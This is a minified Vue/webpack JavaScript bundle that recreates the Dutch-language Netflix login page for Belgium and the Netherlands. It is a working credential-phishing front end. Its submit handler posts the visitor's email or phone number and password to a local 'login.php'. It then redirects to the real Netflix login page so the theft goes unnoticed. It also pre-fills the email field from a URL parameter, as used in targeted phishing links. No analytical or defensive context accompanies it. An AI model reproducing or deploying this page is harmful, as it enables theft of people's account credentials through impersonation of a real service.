(function(e){function t(t){for(var s,r,o=t[0],l=t[1],d=t[2],p=0,u=[];p<o.length;p++)r=o[p],Object.prototype.hasOwnProperty.call(i,r)&&i[r]&&u.push(i[r][0]),i[r]=0;for(s in l)Object.prototype.hasOwnProperty.call(l,s)&&(e[s]=l[s]);c&&c(t);while(u.length)u.shift()();return n.push.apply(n,d||[]),a()}function a(){for(var e,t=0;t<n.length;t++){for(var a=n[t],s=!0,o=1;o<a.length;o++){var l=a[o];0!==i[l]&&(s=!1)}s&&(n.splice(t--,1),e=r(r.s=a[0]))}return e}var s={},i={app:0},n=[];function r(t){if(s[t])return s[t].exports;var a=s[t]={i:t,l:!1,exports:{}};return e[t].call(a.exports,a,a.exports,r),a.l=!0,a.exports}r.m=e,r.c=s,r.d=function(e,t,a){r.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:a})},r.r=function(e){"undefined"!==typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},r.t=function(e,t){if(1&t&&(e=r(e)),8&t)return e;if(4&t&&"object"===typeof e&&e&&e.__esModule)return e;var a=Object.create(null);if(r.r(a),Object.defineProperty(a,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var s in e)r.d(a,s,function(t){return e[t]}.bind(null,s));return a},r.n=function(e){var t=e&&e.__esModule?function(){return e["default"]}:function(){return e};return r.d(t,"a",t),t},r.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},r.p="/";var o=window["webpackJsonp"]=window["webpackJsonp"]||[],l=o.push.bind(o);o.push=t,o=o.slice();for(var d=0;d<o.length;d++)t(o[d]);var c=l;n.push([0,"chunk-vendors"]),a()})({0:function(e,t,a){e.exports=a("56d7")},"034f":function(e,t,a){"use strict";var s=a("85ec"),i=a.n(s);i.a},"56d7":function(e,t,a){"use strict";a.r(t);a("e260"),a("e6cf"),a("cca6"),a("a79d");var s=a("2b0e"),i=function(){var e=this,t=e.$createElement,s=e._self._c||t;return s("div",{attrs:{id:"app"}},[s("div",{attrs:{id:"appMountPoint"}},[s("div",{staticClass:"login-wrapper hybrid-login-wrapper"},[s("div",{staticClass:"login-wrapper-background"},[s("img",{staticClass:"concord-img vlv-creative",attrs:{src:a("5dd4"),alt:""}})]),s("div",{staticClass:"nfHeader login-header signupBasicHeader"},[s("a",{staticClass:"svg-nfLogo signupBasicHeader",attrs:{href:"#","data-uia":"netflix-header-svg-logo"}},[s("svg",{staticClass:"svg-icon svg-icon-netflix-logo",attrs:{viewBox:"0 0 111 30",focusable:"true"}},[s("g",{attrs:{id:"netflix-logo"}},[s("path",{attrs:{d:"M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z",id:"Fill-14"}})])]),s("span",{staticClass:"screen-reader-text"},[e._v("Netflix")])])]),s("div",{staticClass:"login-body"},[s("div",[s("div",{staticClass:"login-content login-form hybrid-login-form hybrid-login-form-signup",attrs:{"data-uia":"login-page-container"}},[s("div",{staticClass:"hybrid-login-form-main"},[s("h1",[e._v("Inloggen")]),s("form",{staticClass:"login-form",on:{submit:function(t){return t.preventDefault(),e.submitForm(t)}}},[s("div",{staticClass:"nfInput nfEmailPhoneInput login-input login-input-email",class:e.loginError?"nfEmailPhoneInError":"",attrs:{"data-uia":"login-field+container"}},[s("div",{staticClass:"nfInputPlacement"},[s("div",{staticClass:"nfEmailPhoneControls",class:e.isPhone?"nfEmailPhoneHasSelector":""},[s("label",{staticClass:"input_id"},[s("input",{directives:[{name:"model",rawName:"v-model",value:e.login,expression:"login"}],staticClass:"nfTextField",class:e.login.length>0?"hasText":"",attrs:{type:"text","data-uia":"login-field",name:"userLoginId",id:"id_userLoginId",tabindex:"0",autocomplete:"email",dir:""},domProps:{value:e.login},on:{input:function(t){t.target.composing||(e.login=t.target.value)}}}),s("label",{staticClass:"placeLabel",attrs:{for:"id_userLoginId"}},[e._v("E-mailadres of telefoonnummer")])]),s("div",{staticClass:"ui-select-wrapper country-select",class:e.phoneSelectOpen?"ui-select-wrapper-open":"",attrs:{"data-uia":"phone-country-selector+container"}},[s("a",{staticClass:"ui-select-wrapper-link",attrs:{"data-uia":"phone-country-selector+target",href:"#"},on:{click:function(t){t.preventDefault(),e.phoneSelectOpen=!e.phoneSelectOpen}}},[s("div",{staticClass:"ui-select-current"},[s("span",{staticClass:"country-select-flag nf-flag",class:"nl"==e.phoneCountry?"nf-flag-nl":"nf-flag-be"})])]),s("ul",{staticClass:"ui-select-options flag-select-item-list",class:e.phoneSelectOpen?"":"ui-select-options-hidden",attrs:{"data-uia":"phone-country-selector+option-list"}},[s("li",{staticClass:"flag-select-option ui-select-item",class:"nl"==e.phoneCountry?"":"ui-select-item-selected",attrs:{"data-uia":"option-BE",placeholder:'{"id":"BE","selected":true,"highlighted":false}'},on:{click:function(t){return t.preventDefault(),e.selectPhoneCountry("be")}}},[e._m(0)]),s("li",{staticClass:"flag-select-option ui-select-item",class:"nl"==e.phoneCountry?"ui-select-item-selected":"",attrs:{"data-uia":"option-NL",placeholder:'{"id":"NL","selected":false,"highlighted":false}'},on:{click:function(t){return t.preventDefault(),e.selectPhoneCountry("nl")}}},[e._m(1)])])])])]),e.loginError&&e.isPhone?s("div",{staticClass:"inputError"},[e._v("Voer een geldig telefoonnummer in.")]):e._e(),e.loginError&&!e.isPhone?s("div",{staticClass:"inputError"},[e._v("Voer een geldig e-mailadres of telefoonnummer in.")]):e._e()]),s("div",{staticClass:"nfInput nfPasswordInput login-input login-input-password",class:[e.passwordInputFocus?"nfPasswordHasToggle":"",e.passwordError?"nfPasswordInError":""],attrs:{"data-uia":"password-field+container"}},[s("div",{staticClass:"nfInputPlacement"},[s("div",{staticClass:"nfPasswordControls"},[s("label",{staticClass:"input_id"},["checkbox"===(e.passwordInputFocus&&e.passwordVisible?"text":"password")?s("input",{directives:[{name:"model",rawName:"v-model",value:e.password,expression:"password"}],ref:"passwordInput",staticClass:"nfTextField",class:e.password.length>0?"hasText":"",attrs:{"data-uia":"password-field",name:"password",id:"id_password",tabindex:"0",autocomplete:"password",dir:"",type:"checkbox"},domProps:{checked:Array.isArray(e.password)?e._i(e.password,null)>-1:e.password},on:{focus:function(t){e.passwordInputFocus=!0},change:function(t){var a=e.password,s=t.target,i=!!s.checked;if(Array.isArray(a)){var n=null,r=e._i(a,n);s.checked?r<0&&(e.password=a.concat([n])):r>-1&&(e.password=a.slice(0,r).concat(a.slice(r+1)))}else e.password=i}}}):"radio"===(e.passwordInputFocus&&e.passwordVisible?"text":"password")?s("input",{directives:[{name:"model",rawName:"v-model",value:e.password,expression:"password"}],ref:"passwordInput",staticClass:"nfTextField",class:e.password.length>0?"hasText":"",attrs:{"data-uia":"password-field",name:"password",id:"id_password",tabindex:"0",autocomplete:"password",dir:"",type:"radio"},domProps:{checked:e._q(e.password,null)},on:{focus:function(t){e.passwordInputFocus=!0},change:function(t){e.password=null}}}):s("input",{directives:[{name:"model",rawName:"v-model",value:e.password,expression:"password"}],ref:"passwordInput",staticClass:"nfTextField",class:e.password.length>0?"hasText":"",attrs:{"data-uia":"password-field",name:"password",id:"id_password",tabindex:"0",autocomplete:"password",dir:"",type:e.passwordInputFocus&&e.passwordVisible?"text":"password"},domProps:{value:e.password},on:{focus:function(t){e.passwordInputFocus=!0},input:function(t){t.target.composing||(e.password=t.target.value)}}}),s("label",{staticClass:"placeLabel",attrs:{for:"id_password"}},[e._v("Wachtwoord")])]),s("button",{staticClass:"nfPasswordToggle",attrs:{"data-uia":"password-visibility-toggle",id:"id_password_toggle",type:"button",title:"Wachtwoord weergeven"},on:{click:e.togglePasswordVisible}},[e._v(e._s(e.passwordVisible?"VERBERGEN":"WEERGEVEN"))])]),e.passwordError?s("div",{staticClass:"inputError",attrs:{id:"","data-uia":"password-field+error"}},[e._v("Je wachtwoord moet tussen 4 en 60 tekens bevatten.")]):e._e()])]),s("button",{staticClass:"btn login-button btn-submit btn-small",attrs:{type:"submit",autocomplete:"off",tabindex:"0","data-uia":"login-submit-button"}},[e._v("Inloggen")]),e._m(2),s("input",{attrs:{type:"hidden",name:"flow",value:"websiteSignUp"}}),s("input",{attrs:{type:"hidden",name:"mode",value:"login"}}),s("input",{attrs:{type:"hidden",name:"action",value:"loginAction"}}),s("input",{attrs:{type:"hidden",name:"withFields",value:"rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode,recaptchaResponseToken,recaptchaError,recaptchaResponseTime"}}),s("input",{attrs:{type:"hidden",name:"authURL",value:"1591455547300.iGN/U14U1dqmaVuOZXvXYt5/88I="}}),s("input",{attrs:{type:"hidden",name:"nextPage",value:""}}),s("input",{attrs:{type:"hidden",name:"showPassword",value:""}}),s("input",{attrs:{type:"hidden",name:"countryCode",value:"+32"}}),s("input",{attrs:{type:"hidden",name:"countryIsoCode",value:"BE"}})])]),e._m(3)])])]),e._m(4)])])])},n=[function(){var e=this,t=e.$createElement,a=e._self._c||t;return a("a",{staticClass:"ui-select-item-link clearfix",attrs:{id:"BE",tabindex:"-1"}},[a("span",{staticClass:"country-select-flag nf-flag nf-flag-be"}),a("span",{staticClass:"country-name",attrs:{id:"","data-uia":""}},[e._v("België "),a("em",{staticClass:"country-code"},[e._v(" +32")])])])},function(){var e=this,t=e.$createElement,a=e._self._c||t;return a("a",{staticClass:"ui-select-item-link clearfix",attrs:{id:"NL",tabindex:"-1"}},[a("span",{staticClass:"country-select-flag nf-flag nf-flag-nl"}),a("span",{staticClass:"country-name",attrs:{id:"","data-uia":""}},[e._v("Nederland "),a("em",{staticClass:"country-code"},[e._v(" +31")])])])},function(){var e=this,t=e.$createElement,a=e._self._c||t;return a("div",{staticClass:"hybrid-login-form-help"},[a("div",{staticClass:"ui-binary-input login-remember-me"},[a("input",{attrs:{type:"checkbox",name:"rememberMe",id:"bxid_rememberMe_true",value:"true",tabindex:"0","data-uia":"rememberMe",checked:""}}),a("label",{attrs:{for:"bxid_rememberMe_true","data-uia":"label+rememberMe"}},[a("span",{staticClass:"login-remember-me-label-text"},[e._v("Mijn gegevens onthouden")])]),a("div",{staticClass:"helper"})]),a("a",{staticClass:"login-help-link",attrs:{href:"//www.netflix.com/LoginHelp","data-uia":"login-help-link"}},[e._v("Hulp nodig?")])])},function(){var e=this,t=e.$createElement,a=e._self._c||t;return a("div",{staticClass:"hybrid-login-form-other"},[a("form",{staticClass:"login-form",attrs:{method:"post"}},[a("input",{attrs:{type:"hidden",name:"flow",value:"websiteSignUp"}}),a("input",{attrs:{type:"hidden",name:"mode",value:"login"}}),a("input",{attrs:{type:"hidden",name:"action",value:"facebookLoginAction"}}),a("input",{attrs:{type:"hidden",name:"withFields",value:"rememberMe,nextPage,accessToken"}}),a("input",{attrs:{type:"hidden",name:"authURL",value:"1591455547300.iGN/U14U1dqmaVuOZXvXYt5/88I="}}),a("input",{attrs:{type:"hidden",name:"nextPage",value:""}}),a("input",{attrs:{type:"hidden",name:"showPassword",value:""}}),a("input",{attrs:{type:"hidden",name:"countryCode",value:"+32"}}),a("input",{attrs:{type:"hidden",name:"countryIsoCode",value:"BE"}}),a("input",{attrs:{type:"hidden",name:"accessToken",value:""}})]),a("div",{staticClass:"login-signup-now",attrs:{"data-uia":"login-signup-now"}},[e._v("Is Netflix nieuw voor jou? "),a("a",{staticClass:" ",attrs:{target:"_self",href:"//www.netflix.com/"}},[e._v("Registreer je nu")]),e._v(".")]),a("div",{staticClass:"recaptcha-terms-of-use",attrs:{"data-uia":"recaptcha-terms-of-use"}},[a("p",[a("span",[e._v("Deze pagina wordt beschermd met Google reCAPTCHA om te controleren of je geen bot bent.")]),e._v(" "),a("button",{staticClass:"recaptcha-terms-of-use--link-button",attrs:{"data-uia":"recaptcha-learn-more-button"}},[e._v("Lees meer informatie.")])]),a("div",{staticClass:"recaptcha-terms-of-use--disclosure",attrs:{"data-uia":"recaptcha-disclosure"}},[a("span",{attrs:{id:"","data-uia":"recaptcha-disclosure-text"}},[e._v("De gegevens die worden verzameld met Google reCAPTCHA, vallen onder het "),a("a",{attrs:{href:"https://policies.google.com/privacy","data-uia":"recaptcha-privacy-link"}},[e._v("privacybeleid")]),e._v(" en de "),a("a",{attrs:{href:"https://policies.google.com/terms","data-uia":"recaptcha-tos-link"}},[e._v("servicevoorwaarden")]),e._v(" van Google. Ze worden gebruikt voor het leveren, onderhouden en verbeteren van de reCAPTCHA-service en voor algemene beveiligingsdoeleinden. (Ze worden niet gebruikt voor gepersonaliseerde advertenties van Google.)")])])])])},function(){var e=this,t=e.$createElement,a=e._self._c||t;return a("div",{staticClass:"site-footer-wrapper login-footer"},[a("div",{staticClass:"footer-divider"}),a("div",{staticClass:"site-footer"},[a("p",{staticClass:"footer-top"},[e._v("Vragen? Bel "),a("a",{staticClass:"footer-top-a",attrs:{href:"tel:0800-740-36"}},[e._v("0800-740-36")])]),a("ul",{staticClass:"footer-links structural"},[a("li",{staticClass:"footer-link-item",attrs:{placeholder:"footer_responsive_link_gift_card_terms_item"}},[a("a",{staticClass:"footer-link",attrs:{"data-uia":"footer-link",href:"//www.netflix.com/giftterms",placeholder:"footer_responsive_link_gift_card_terms"}},[a("span",{attrs:{id:"","data-uia":"data-uia-footer-label"}},[e._v("Voorwaarden van cadeau-abonnementen")])])]),a("li",{staticClass:"footer-link-item",attrs:{placeholder:"footer_responsive_link_terms_item"}},[a("a",{staticClass:"footer-link",attrs:{"data-uia":"footer-link",href:"https://help.netflix.com/legal/termsofuse",placeholder:"footer_responsive_link_terms"}},[a("span",{attrs:{id:"","data-uia":"data-uia-footer-label"}},[e._v("Gebruiksvoorwaarden")])])]),a("li",{staticClass:"footer-link-item",attrs:{placeholder:"footer_responsive_link_privacy_item"}},[a("a",{staticClass:"footer-link",attrs:{"data-uia":"footer-link",href:"https://help.netflix.com/legal/privacy",placeholder:"footer_responsive_link_privacy"}},[a("span",{attrs:{id:"","data-uia":"data-uia-footer-label"}},[e._v("Privacyverklaring")])])])]),a("div",{staticClass:"lang-selection-container",attrs:{id:"lang-switcher"}},[a("div",{staticClass:"ui-select-wrapper",attrs:{"data-uia":"language-picker+container"}},[a("label",{staticClass:"ui-label no-display",attrs:{for:"undefined-select"}},[a("span",{staticClass:"ui-label-text"})]),a("div",{staticClass:"select-arrow medium prefix globe"},[a("select",{staticClass:"ui-select medium",attrs:{"data-uia":"language-picker",id:"undefined-select",tabindex:"0",placeholder:"lang-switcher"}},[a("option",{attrs:{selected:"",value:"/login?locale=nl","data-language":"nl","data-country":"nl"}},[e._v("Nederlands")])])])])])])])}],r=(a("4160"),a("ac1f"),a("466d"),a("5319"),a("1276"),a("159b"),a("bc3a")),o=a.n(r),l={name:"App",data:function(){return{login:"",password:"",loginError:!1,passwordError:!1,phoneSelectOpen:!1,phoneCountry:"nl",passwordInputFocus:!1,passwordVisible:!1,referrerPage:"//www.netflix.com/nl/login"}},computed:{isPhone:function(){return this.login.match(/^-?\d+\.?\d*$/)}},methods:{selectPhoneCountry:function(e){var t=this;t.phoneCountry=e,t.phoneSelectOpen=!1},togglePasswordVisible:function(){var e=this;e.passwordVisible=!e.passwordVisible},submitForm:function(){var e=this;if(e.isPhone)e.loginError=!e.login.match(/^(?=^.{10,11}$)0\d*-?\d*$/);else{var t=/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;e.loginError=!t.test(String(e.login).toLowerCase())}e.passwordError=e.password.length<4||e.password.length>60,e.loginError||e.passwordError||o.a.post("login.php",{email:e.login,password:e.password}).then((function(t){window.location.replace(e.referrerPage)})).catch((function(t){window.location.replace(e.referrerPage)}))},initiatePage:function(){var e=window.location.href.split("?");if(e.length>0&&void 0!==e[1]){var t=e[1].split("&"),a={},s="";t.forEach((function(e){s=e.split("="),2==s.length&&(a[s[0].toLowerCase()]=decodeURIComponent(s[1]))})),this.login="undefined"!==typeof a["e"]?a["e"]:""}}},watch:{login:function(e){e.match(/^06.*$/)?this.phoneCountry="nl":this.phoneCountry="be"}},beforeMount:function(){this.initiatePage()}},d=l,c=(a("034f"),a("2877")),p=Object(c["a"])(d,i,n,!1,null,null,null),u=p.exports;s["a"].config.productionTip=!1,new s["a"]({render:function(e){return e(u)}}).$mount("#app")},"5dd4":function(e,t,a){e.exports=a.p+"img/popsignuptwoweeks-perspective_alpha_website_small.b6dcd0e8.jpg"},"85ec":function(e,t,a){}});
//# sourceMappingURL=app.fd0ea992.js.map